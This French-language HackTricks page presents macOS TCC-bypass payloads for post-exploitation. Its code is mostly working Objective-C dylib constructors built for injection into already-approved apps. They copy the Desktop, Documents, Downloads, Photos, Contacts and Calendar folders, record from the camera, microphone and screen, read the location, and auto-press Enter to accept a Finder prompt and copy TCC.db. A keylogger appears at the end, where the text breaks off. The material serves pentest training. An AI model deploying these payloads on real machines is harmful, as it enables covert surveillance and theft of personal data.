# macOS TCC Payloads

{{#include ../../../../banners/hacktricks-training.md}}

> [!TIP]
> Les décisions TCC sont liées à **l'identité du processus** qui demande l'accès à la ressource. En post-exploitation, l'objectif habituel est d'**injecter ces payloads dans une application déjà approuvée** (ou de les exécuter d'une autre manière dans son bundle / contexte de signature) plutôt que d'exécuter un nouvel helper qui déclenchera sa propre invite.
>
> Pour **Screen Recording**, **Input Monitoring** et les **entrées synthétiques**, les versions modernes de macOS exposent également des API explicites de preflight / request telles que `CGPreflightScreenCaptureAccess`, `CGRequestScreenCaptureAccess`, `CGRequestListenEventAccess` et `CGRequestPostEventAccess`.

> [!WARNING]
> Il s'agit toujours d'une voie d'attaque très réaliste : des recherches récentes sur le vol d'autorisations visant des applications Microsoft pour macOS ont montré qu'une **validation faible des bibliothèques / un chargement de plugins** peut permettre à un attaquant de réutiliser les autorisations TCC déjà accordées à l'application victime pour la **caméra**, le **microphone** et d'autres ressources, sans seconde invite.<sup>[[1]](#references)</sup>

## Triage rapide avant d'utiliser un payload

Les recherches récentes sur le vol d'autorisations continuent de confirmer le même workflow : trouver d'abord une application qui dispose déjà de l'autorisation TCC souhaitée, puis vérifier qu'elle constitue une cible d'injection réaliste.<sup>[[1]](#references)</sup>
```bash
sqlite3 "$HOME/Library/Application Support/com.apple.TCC/TCC.db" \
"select service, client from access where auth_value=2 and service in ('kTCCServiceCamera','kTCCServiceMicrophone','kTCCServiceScreenCapture','kTCCServiceAccessibility') order by service, client;"

codesign -d --entitlements :- /Applications/Target.app 2>/dev/null | \
egrep 'disable-library-validation|allow-dyld-environment-variables'
```
Si la cible charge également des plug-ins / frameworks contrôlés par l'attaquant, ces payloads deviennent beaucoup plus intéressants. Pour des idées plus générales de post-exploitation après avoir pris pied dans un processus déjà approuvé, consultez [cette page associée](macos-tcc-credential-and-data-theft.md).

### Bureau

- **Entitlement** : Aucun
- **TCC** : kTCCServiceSystemPolicyDesktopFolder

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copier `$HOME/Desktop` vers `/tmp/desktop`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Desktop"];
NSString *tmpPhotosPath = @"/tmp/desktop";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copiez `$HOME/Desktop` vers `/tmp/desktop`.
```bash
cp -r "$HOME/Desktop" "/tmp/desktop"
```
{{#endtab}}
{{#endtabs}}

### Documents

- **Entitlement**: None
- **TCC**: `kTCCServiceSystemPolicyDocumentsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copier `$HOME/Documents` vers `/tmp/documents`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Documents"];
NSString *tmpPhotosPath = @"/tmp/documents";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copier `$HOME/`Documents vers `/tmp/documents`.
```bash
cp -r "$HOME/Documents" "/tmp/documents"
```
{{#endtab}}
{{#endtabs}}

### Téléchargements

- **Entitlement**: Aucun
- **TCC**: `kTCCServiceSystemPolicyDownloadsFolder`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copier `$HOME/Downloads` vers `/tmp/downloads`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Downloads"];
NSString *tmpPhotosPath = @"/tmp/downloads";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copiez `$HOME/Downloads` vers `/tmp/downloads`.
```bash
cp -r "$HOME/Downloads" "/tmp/downloads"
```
{{#endtab}}
{{#endtabs}}

### Bibliothèque Photos

- **Droit**: `com.apple.security.personal-information.photos-library`
- **TCC**: `kTCCServicePhotos`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copier `$HOME/Pictures/Photos Library.photoslibrary` vers `/tmp/photos`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Pictures/Photos Library.photoslibrary"];
NSString *tmpPhotosPath = @"/tmp/photos";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copier `$HOME/Pictures/Photos Library.photoslibrary` vers `/tmp/photos`.
```bash
cp -r "$HOME/Pictures/Photos Library.photoslibrary" "/tmp/photos"
```
{{#endtab}}
{{#endtabs}}

### Contacts

- **Entitlement**: `com.apple.security.personal-information.addressbook`
- **TCC**: `kTCCServiceAddressBook`

{{#tabs}}
{{#tab name="ObjetiveC"}}
Copiez `$HOME/Library/Application Support/AddressBook` vers `/tmp/contacts`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Application Support/AddressBook"];
NSString *tmpPhotosPath = @"/tmp/contacts";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copier `$HOME/Library/Application Support/AddressBook` vers `/tmp/contacts`.
```bash
cp -r "$HOME/Library/Application Support/AddressBook" "/tmp/contacts"
```
{{#endtab}}
{{#endtabs}}

### Calendrier

- **Autorisation**: `com.apple.security.personal-information.calendars`
- **TCC**: `kTCCServiceCalendar`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Copier `$HOME/Library/Calendars` vers `/tmp/calendars`.
```objectivec
#include <syslog.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#import <Foundation/Foundation.h>

// gcc -dynamiclib -framework Foundation -o /tmp/inject.dylib /tmp/inject.m

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSFileManager *fileManager = [NSFileManager defaultManager];
NSError *error = nil;

// Get the path to the user's Pictures folder
NSString *picturesPath = [NSHomeDirectory() stringByAppendingPathComponent:@"Library/Calendars/"];
NSString *tmpPhotosPath = @"/tmp/calendars";

// Copy the contents recursively
if (![fileManager copyItemAtPath:picturesPath toPath:tmpPhotosPath error:&error]) {
NSLog(@"Error copying items: %@", error);
}

NSLog(@"Copy completed successfully.", error);

fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="Shell"}}
Copier `$HOME/Library/Calendars` vers `/tmp/calendars`.
```bash
cp -r "$HOME/Library/Calendars" "/tmp/calendars"
```
{{#endtab}}
{{#endtabs}}

### Camera

- **Entitlement**: `com.apple.security.device.camera`
- **TCC**: `kTCCServiceCamera`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Enregistrer une vidéo de 3 secondes et la sauvegarder dans **`/tmp/recording.mov`**<sup>[[5]](#references)</sup>.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from: https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface VideoRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>
@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *videoDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *movieFileOutput;
- (void)startRecording;
- (void)stopRecording;
@end
@implementation VideoRecorder
- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}
- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;
AVCaptureDevice *videoDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
NSError *error;
self.videoDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:videoDevice error:&error];
if (error) {
NSLog(@"Error setting up video device input: %@", [error localizedDescription]);
return;
}
if ([self.captureSession canAddInput:self.videoDeviceInput]) {
[self.captureSession addInput:self.videoDeviceInput];
}
self.movieFileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([self.captureSession canAddOutput:self.movieFileOutput]) {
[self.captureSession addOutput:self.movieFileOutput];
}
}
- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = @"/tmp/recording.mov";
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.movieFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}
- (void)stopRecording {
[self.movieFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}
#pragma mark - AVCaptureFileOutputRecordingDelegate
- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
}
@end
__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
VideoRecorder *videoRecorder = [[VideoRecorder alloc] init];
[videoRecorder startRecording];
[NSThread sleepForTimeInterval:3.0];
[videoRecorder stopRecording];
[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:3.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Vérifier si le programme a accès à la caméra.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// gcc -framework Foundation -framework AVFoundation -dynamiclib CamTest.m -o CamTest.dylib
// Code from https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4

@interface CameraAccessChecker : NSObject
+ (BOOL)hasCameraAccess;
@end
@implementation CameraAccessChecker
+ (BOOL)hasCameraAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to camera granted.");
return YES;
} else {
NSLog(@"[-] Access to camera denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
[CameraAccessChecker hasCameraAccess];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Déclencher l’invite d’accès à la caméra si le processus actuel est toujours `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void camprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeVideo] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeVideo completionHandler:^(BOOL granted) {
NSLog(@"Camera prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Prendre une photo avec la caméra
```bash
ffmpeg -framerate 30 -f avfoundation -i "0" -frames:v 1 /tmp/capture.jpg
```
{{#endtab}}
{{#endtabs}}

### Microphone

- **Entitlement**: **com.apple.security.device.audio-input**
- **TCC**: `kTCCServiceMicrophone`

{{#tabs}}
{{#tab name="ObjetiveC - Record"}}
Enregistrer 5 s d’audio et le stocker dans `/tmp/recording.m4a`<sup>[[6]](#references)</sup>.
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// Code from https://www.vicarius.io/vsociety/posts/cve-2023-26818-exploit-macos-tcc-bypass-w-telegram-part-1-2
// gcc -dynamiclib -framework Foundation -framework AVFoundation Micexploit.m -o Micexploit.dylib

@interface AudioRecorder : NSObject <AVCaptureFileOutputRecordingDelegate>

@property (strong, nonatomic) AVCaptureSession *captureSession;
@property (strong, nonatomic) AVCaptureDeviceInput *audioDeviceInput;
@property (strong, nonatomic) AVCaptureMovieFileOutput *audioFileOutput;

- (void)startRecording;
- (void)stopRecording;

@end

@implementation AudioRecorder

- (instancetype)init {
self = [super init];
if (self) {
[self setupCaptureSession];
}
return self;
}

- (void)setupCaptureSession {
self.captureSession = [[AVCaptureSession alloc] init];
self.captureSession.sessionPreset = AVCaptureSessionPresetHigh;

AVCaptureDevice *audioDevice = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeAudio];
NSError *error;
self.audioDeviceInput = [[AVCaptureDeviceInput alloc] initWithDevice:audioDevice error:&error];

if (error) {
NSLog(@"Error setting up audio device input: %@", [error localizedDescription]);
return;
}

if ([self.captureSession canAddInput:self.audioDeviceInput]) {
[self.captureSession addInput:self.audioDeviceInput];
}

self.audioFileOutput = [[AVCaptureMovieFileOutput alloc] init];

if ([self.captureSession canAddOutput:self.audioFileOutput]) {
[self.captureSession addOutput:self.audioFileOutput];
}
}

- (void)startRecording {
[self.captureSession startRunning];
NSString *outputFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"recording.m4a"];
NSURL *outputFileURL = [NSURL fileURLWithPath:outputFilePath];
[self.audioFileOutput startRecordingToOutputFileURL:outputFileURL recordingDelegate:self];
NSLog(@"Recording started");
}

- (void)stopRecording {
[self.audioFileOutput stopRecording];
[self.captureSession stopRunning];
NSLog(@"Recording stopped");
}

#pragma mark - AVCaptureFileOutputRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)captureOutput
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray<AVCaptureConnection *> *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording failed: %@", [error localizedDescription]);
} else {
NSLog(@"Recording finished successfully. Saved to %@", outputFileURL.path);
}
NSLog(@"Saved to %@", outputFileURL.path);
}

@end

__attribute__((constructor))
static void myconstructor(int argc, const char **argv) {

freopen("/tmp/logs.txt", "a", stderr);
AudioRecorder *audioRecorder = [[AudioRecorder alloc] init];

[audioRecorder startRecording];
[NSThread sleepForTimeInterval:5.0];
[audioRecorder stopRecording];

[[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
fclose(stderr); // Close the file stream
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check"}}
Vérifier si l’application a accès au microphone.<sup>[[5]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// From https://vsociety.medium.com/cve-2023-26818-macos-tcc-bypass-with-telegram-using-dylib-injection-part1-768b34efd8c4
// gcc -framework Foundation -framework AVFoundation -dynamiclib MicTest.m -o MicTest.dylib

@interface MicrophoneAccessChecker : NSObject
+ (BOOL)hasMicrophoneAccess;
@end
@implementation MicrophoneAccessChecker
+ (BOOL)hasMicrophoneAccess {
AVAuthorizationStatus status = [AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio];
if (status == AVAuthorizationStatusAuthorized) {
NSLog(@"[+] Access to microphone granted.");
return YES;
} else {
NSLog(@"[-] Access to microphone denied.");
return NO;
}
}
@end
__attribute__((constructor))
static void telegram(int argc, const char **argv) {
[MicrophoneAccessChecker hasMicrophoneAccess];
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Prompt"}}
Déclencher l’invite d’accès au microphone si le processus actuel est toujours `NotDetermined`.<sup>[[3]](#references)</sup>
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>
#import <dispatch/dispatch.h>
__attribute__((constructor))
static void micprompt(int argc, const char **argv) {
if ([AVCaptureDevice authorizationStatusForMediaType:AVMediaTypeAudio] != AVAuthorizationStatusNotDetermined) return;
dispatch_semaphore_t sem = dispatch_semaphore_create(0);
[AVCaptureDevice requestAccessForMediaType:AVMediaTypeAudio completionHandler:^(BOOL granted) {
NSLog(@"Microphone prompt result: %@", granted ? @"granted" : @"denied");
dispatch_semaphore_signal(sem);
}];
dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Enregistrez un fichier audio de 5 s et stockez-le dans `/tmp/recording.wav`
```bash
# Check the microphones
ffmpeg -f avfoundation -list_devices true -i ""
# Use microphone from index 1 from the previous list to record
ffmpeg -f avfoundation -i ":1" -t 5 /tmp/recording.wav
```
{{#endtab}}
{{#endtabs}}

### Emplacement

> [!TIP]
> Pour qu'une app puisse obtenir l'emplacement, les **Services de localisation** (dans Confidentialité et sécurité) **doivent être activés ;** sinon, elle ne pourra pas y accéder.

- **Entitlement** : `com.apple.security.personal-information.location`
- **TCC** : accordé dans `/var/db/locationd/clients.plist`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Écrire l'emplacement dans `/tmp/logs.txt`
```objectivec
#include <syslog.h>
#include <stdio.h>
#import <Foundation/Foundation.h>
#import <CoreLocation/CoreLocation.h>

@interface LocationManagerDelegate : NSObject <CLLocationManagerDelegate>
@end

@implementation LocationManagerDelegate

- (void)locationManager:(CLLocationManager *)manager didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *location = [locations lastObject];
NSLog(@"Current location: %@", location);
exit(0); // Exit the program after receiving the first location update
}

- (void)locationManager:(CLLocationManager *)manager didFailWithError:(NSError *)error {
NSLog(@"Error getting location: %@", error);
exit(1); // Exit the program on error
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt

NSLog(@"Getting location");
CLLocationManager *locationManager = [[CLLocationManager alloc] init];
LocationManagerDelegate *delegate = [[LocationManagerDelegate alloc] init];
locationManager.delegate = delegate;

[locationManager requestWhenInUseAuthorization]; // or use requestAlwaysAuthorization
[locationManager startUpdatingLocation];

NSRunLoop *runLoop = [NSRunLoop currentRunLoop];
while (true) {
[runLoop runUntilDate:[NSDate dateWithTimeIntervalSinceNow:1.0]];
}

NSLog(@"Location completed successfully.");
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="Shell"}}
Obtenir l'emplacement actuel depuis le shell.<sup>[[2]](#references)</sup>
```bash
# Fast option: use a dedicated CoreLocation CLI helper
brew install --cask corelocationcli
CoreLocationCLI --json

# Keep printing updates while the device moves
CoreLocationCLI --watch --format '%latitude %longitude %speed %time'
```
> [!TIP]
> Cela dépend toujours de l’activation des **Services de localisation** et de l’approbation TCC accordée à l’outil / au terminal. `CoreLocationCLI` s’appuie également sur le positionnement assisté par Wi-Fi sur la plupart des Mac. Ainsi, lorsque le Wi-Fi est désactivé, cela se termine souvent par `kCLErrorDomain error 0`.

{{#endtab}}
{{#endtabs}}

### Enregistrement de l’écran

- **Entitlement**: Aucun
- **TCC**: `kTCCServiceScreenCapture`

{{#tabs}}
{{#tab name="ObjectiveC"}}
Enregistrer l’écran principal pendant 5 s dans `/tmp/screen.mov`
```objectivec
#import <Foundation/Foundation.h>
#import <AVFoundation/AVFoundation.h>

// clang -framework Foundation -framework AVFoundation -framework CoreVideo -framework CoreMedia -framework CoreGraphics -o ScreenCapture ScreenCapture.m

@interface MyRecordingDelegate : NSObject <AVCaptureFileOutputRecordingDelegate>
@end

@implementation MyRecordingDelegate

- (void)captureOutput:(AVCaptureFileOutput *)output
didFinishRecordingToOutputFileAtURL:(NSURL *)outputFileURL
fromConnections:(NSArray *)connections
error:(NSError *)error {
if (error) {
NSLog(@"Recording error: %@", error);
} else {
NSLog(@"Recording finished successfully.");
}
exit(0);
}

@end

__attribute__((constructor))
void myconstructor(int argc, const char **argv)
{
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
AVCaptureSession *captureSession = [[AVCaptureSession alloc] init];
AVCaptureScreenInput *screenInput = [[AVCaptureScreenInput alloc] initWithDisplayID:CGMainDisplayID()];
if ([captureSession canAddInput:screenInput]) {
[captureSession addInput:screenInput];
}

AVCaptureMovieFileOutput *fileOutput = [[AVCaptureMovieFileOutput alloc] init];
if ([captureSession canAddOutput:fileOutput]) {
[captureSession addOutput:fileOutput];
}

[captureSession startRunning];

MyRecordingDelegate *delegate = [[MyRecordingDelegate alloc] init];
[fileOutput startRecordingToOutputFileURL:[NSURL fileURLWithPath:@"/tmp/screen.mov"] recordingDelegate:delegate];

// Run the loop for 5 seconds to capture
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
[fileOutput stopRecording];
});

CFRunLoopRun();
freopen("/tmp/logs.txt", "w", stderr); // Redirect stderr to /tmp/logs.txt
}
```
{{#endtab}}

{{#tab name="ObjectiveC - Check / Prompt"}}
Vérifier si le processus actuel peut capturer l’écran et déclencher l’invite TCC si nécessaire.
```objectivec
#import <Foundation/Foundation.h>
#import <CoreGraphics/CoreGraphics.h>

// clang -framework Foundation -framework CoreGraphics -dynamiclib ScreenCheck.m -o ScreenCheck.dylib

__attribute__((constructor))
static void screencheck(int argc, const char **argv) {
freopen("/tmp/logs.txt", "a", stderr);
BOOL allowed = CGPreflightScreenCaptureAccess();
if (!allowed) {
allowed = CGRequestScreenCaptureAccess();
}
NSLog(@"Screen capture access: %@", allowed ? @"granted" : @"denied");
fclose(stderr);
}
```
{{#endtab}}

{{#tab name="Shell"}}
Enregistrez l’écran principal pendant 5 s
```bash
screencapture -V 5 /tmp/screen.mov
```
{{#endtab}}
{{#endtabs}}

> [!TIP]
> Sur **macOS 12.3+**, `ScreenCaptureKit` est généralement une meilleure primitive de post-exploitation que `AVCaptureScreenInput` : il permet le streaming haute performance, les captures d'une seule image avec `SCScreenshotManager` et le streaming de l'**audio système**. Les mises à jour récentes de `ScreenCaptureKit` ont également ajouté `captureMicrophone` / `microphoneCaptureDeviceID` à `SCStreamConfiguration`, ainsi que `SCRecordingOutput` pour l'enregistrement direct dans un fichier. Ainsi, un client de capture d'écran hijacké peut enregistrer directement l'écran et l'audio système, et ajouter l'audio du microphone lorsque le processus détient également `kTCCServiceMicrophone`.<sup>[[4]](#references)</sup> Pour découvrir davantage de primitives d'abus de session desktop, consultez [cette page associée](../macos-input-monitoring-screen-capture-accessibility.md).

### Accessibilité

- **Entitlement** : Aucun
- **TCC** : `kTCCServiceAccessibility`

Utiliser le privilège TCC pour accepter le contrôle de Finder en appuyant sur Entrée et contourner ainsi TCC

{{#tabs}}
{{#tab name="Accept TCC"}}
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <OSAKit/OSAKit.h>

// clang -framework Foundation -framework ApplicationServices -framework OSAKit -o ParallelScript ParallelScript.m
// TODO: Improve to monitor the foreground app and press enter when TCC appears

void SimulateKeyPress(CGKeyCode keyCode) {
CGEventRef keyDownEvent = CGEventCreateKeyboardEvent(NULL, keyCode, true);
CGEventRef keyUpEvent = CGEventCreateKeyboardEvent(NULL, keyCode, false);
CGEventPost(kCGHIDEventTap, keyDownEvent);
CGEventPost(kCGHIDEventTap, keyUpEvent);
if (keyDownEvent) CFRelease(keyDownEvent);
if (keyUpEvent) CFRelease(keyUpEvent);
}

void RunAppleScript() {
NSLog(@"Starting AppleScript");
NSString *scriptSource = @"tell application \"Finder\"\n"
"set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias\n"
"set targetFolder to POSIX file \"/tmp\" as alias\n"
"duplicate file sourceFile to targetFolder with replacing\n"
"end tell\n";

NSDictionary *errorDict = nil;
NSAppleScript *appleScript = [[NSAppleScript alloc] initWithSource:scriptSource];
[appleScript executeAndReturnError:&errorDict];

if (errorDict) {
NSLog(@"AppleScript Error: %@", errorDict);
}
}

int main() {
@autoreleasepool {
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
RunAppleScript();
});

// Simulate pressing the Enter key every 0.1 seconds
NSLog(@"Starting key presses");
for (int i = 0; i < 10; ++i) {
SimulateKeyPress((CGKeyCode)36); // Key code for Enter
usleep(100000); // 0.1 seconds
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="Check / Prompt"}}
Vérifier si le processus actuel est déjà approuvé pour Accessibility et demander à macOS d'afficher l'interface de consentement s'il ne l'est pas.
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
__attribute__((constructor))
static void axprompt(int argc, const char **argv) {
NSDictionary *opts = @{(__bridge id)kAXTrustedCheckOptionPrompt: @YES};
BOOL trusted = AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts);
NSLog(@"Accessibility access: %@", trusted ? @"granted" : @"pending/denied");
}
```
{{#endtab}}

{{#tab name="Keylogger"}}
Stocker les touches pressées dans **`/tmp/keystrokes.txt`**
```objectivec
#import <Foundation/Foundation.h>
#import <ApplicationServices/ApplicationServices.h>
#import <Carbon/Carbon.h>

// clang -framework Foundation -framework ApplicationServices -framework Carbon -o KeyboardMonitor KeyboardMonitor.m

NSString *const kKeystrokesLogPath = @"/tmp/keystrokes.txt";

void AppendStringToFile(NSString *str, NSString *filePath) {
NSFileHandle *fileHandle = [NSFileHandle fileHandleForWritingAtPath:filePath];
if (fileHandle) {
[fileHandle seekToEndOfFile];
[fileHandle writeData:[str dataUsingEncoding:NSUTF8StringEncoding]];
[fileHandle closeFile];
} else {
// If the file does not exist, create it
[str writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:nil];
}
}

CGEventRef KeyboardEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
if (type == kCGEventKeyDown) {
CGKeyCode keyCode = (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

NSString *keyString = nil;
// First, handle special non-printable keys
switch (keyCode) {
case kVK_Return: keyString = @"<Return>"; break;
case kVK_Tab: keyString = @"<Tab>"; break;
case kVK_Space: keyString = @"<Space>"; break;
case kVK_Delete: keyString = @"<Delete>"; break;
case kVK_Escape: keyString = @"<Escape>"; break;
case kVK_Command: keyString = @"<Command>"; break;
case kVK_Shift: keyString = @"<Shift>"; break;
case kVK_CapsLock: keyString = @"<CapsLock>"; break;
case kVK_Option: keyString = @"<Option>"; break;
case kVK_Control: keyString = @"<Control>"; break;
case kVK_RightControl: keyString = @"<Control>"; break;
case kVK_RightShift: keyString = @"<Shift>"; break;
case kVK_RightOption: keyString = @"<Option>"; break;
case kVK_Function: keyString = @"<Function>"; break;
case kVK_F1: keyString = @"<F1>"; break;
case kVK_F2: keyString = @"<F2>"; break;
case kVK_F3: keyString = @"<F3>"; break;
// Add more cases here for other non-printable keys...
default: break; // Not a special non-printable key
}

